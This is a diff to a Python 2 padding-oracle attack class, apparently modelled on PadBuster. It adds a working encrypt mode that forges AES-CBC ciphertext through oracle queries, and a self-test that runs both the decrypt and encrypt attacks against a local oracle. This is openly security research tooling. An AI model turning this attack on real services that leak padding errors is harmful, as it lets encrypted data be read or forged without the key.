@@ -27,6 +27,7 @@ class PaddingOracle(object):
         self.attempts = 0
         self.history = []
         self._decrypted = None
+        self._encrypted = None
 
     def oracle(self, data):
         '''
@@ -53,11 +54,42 @@ class PaddingOracle(object):
         '''
         raise NotImplementedError
 
-    def encrypt(self, plaintext):
+    def encrypt(self, plaintext, block_size=8, iv=None):
         '''
         Encrypts *plaintext* by exploiting a Padding Oracle.
+
+        :param plaintext: Plaintext data to encrypt.
+        :param block_size: Cipher block size (in bytes).
+        :param iv: The initialization vector (iv), usually the first
+            *block_size* bytes from the ciphertext. If no iv is given
+            or iv is None, the first *block_size* bytes will be null's.
+        :returns: Decrypted data.
         '''
-        raise NotImplementedError
+        pad = block_size - (len(plaintext) % block_size)
+        plaintext = bytearray(plaintext + chr(pad) * pad)
+
+        self.log.debug('Attempting to encrypt %r bytes', str(plaintext))
+
+        if iv is not None:
+            iv = bytearray(iv)
+        else:
+            iv = bytearray(block_size)
+
+        self._encrypted = encrypted = iv
+        block = encrypted
+
+        n = len(plaintext + iv)
+        while n > 0:
+            intermediate_bytes = self.bust(block, block_size=block_size)
+
+            block = xor(intermediate_bytes,
+                               plaintext[n - block_size * 2:n + block_size])
+
+            encrypted = block + encrypted
+
+            n -= block_size
+
+        return encrypted
 
     def decrypt(self, ciphertext, block_size=8, iv=None):
         '''
@@ -153,7 +185,7 @@ class PaddingOracle(object):
                         self.oracle(test_bytes[:])
                     except BadPaddingException:
 
-                        #TODO
+                        # TODO
                         # if a padding oracle was seen in the response,
                         # do not go any further, try the next byte in the
                         # sequence. If we're in analysis mode, re-raise the
@@ -221,9 +253,9 @@ def test():
     teststring = 'The quick brown fox jumped over the lazy dog'
 
     class PadBuster(PaddingOracle):
-        def oracle(self, ctext):
-            cipher = AES.new(key, AES.MODE_CBC, str(bytearray(AES.block_size)))
-            ptext = cipher.decrypt(str(ctext))
+        def oracle(self, data):
+            _cipher = AES.new(key, AES.MODE_CBC, str(iv))
+            ptext = _cipher.decrypt(str(data))
             plen = ord(ptext[-1])
 
             padding_is_good = (ptext[-plen:] == chr(plen) * plen)
@@ -236,22 +268,45 @@ def test():
     padbuster = PadBuster()
 
     key = os.urandom(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CBC, str(bytearray(AES.block_size)))
+    iv = bytearray(os.urandom(AES.block_size))
+
+    print "Testing padding oracle exploit in DECRYPT mode"
+    cipher = AES.new(key, AES.MODE_CBC, str(iv))
 
     data = pkcs7_pad(teststring, blklen=AES.block_size)
     ctext = cipher.encrypt(data)
 
-    iv = bytearray(AES.block_size)
     decrypted = padbuster.decrypt(ctext, block_size=AES.block_size, iv=iv)
+
+    print "Key:        %r" % (key, )
+    print "IV:         %r" % (iv, )
+    print "Plaintext:  %r" % (data, )
+    print "Ciphertext: %r" % (ctext, )
+    print "Decrypted:  %r" % (str(decrypted), )
+    print "\nRecovered in %d attempts\n" % (padbuster.attempts, )
 
     assert decrypted == data, \
         'Decrypted data %r does not match original %r' % (
             decrypted, data)
 
-    print "Data:       %r" % (data, )
-    print "Ciphertext: %r" % (ctext, )
+    print "Testing padding oracle exploit in ENCRYPT mode"
+    cipher2 = AES.new(key, AES.MODE_CBC, str(iv))
+
+    encrypted = padbuster.encrypt(teststring, block_size=AES.block_size)
+
+    decrypted = cipher2.decrypt(str(encrypted))[AES.block_size:]
+    decrypted = decrypted.rstrip(decrypted[-1])
+
+    print "Key:        %r" % (key, )
+    print "IV:         %r" % (iv, )
+    print "Plaintext:  %r" % (teststring, )
+    print "Ciphertext: %r" % (str(encrypted), )
     print "Decrypted:  %r" % (str(decrypted), )
     print "\nRecovered in %d attempts" % (padbuster.attempts, )
+
+    assert decrypted == teststring, \
+        'Encrypted data %r does not decrypt to %r, got %r' % (
+            encrypted, teststring, decrypted)
 
 
 if __name__ == '__main__':
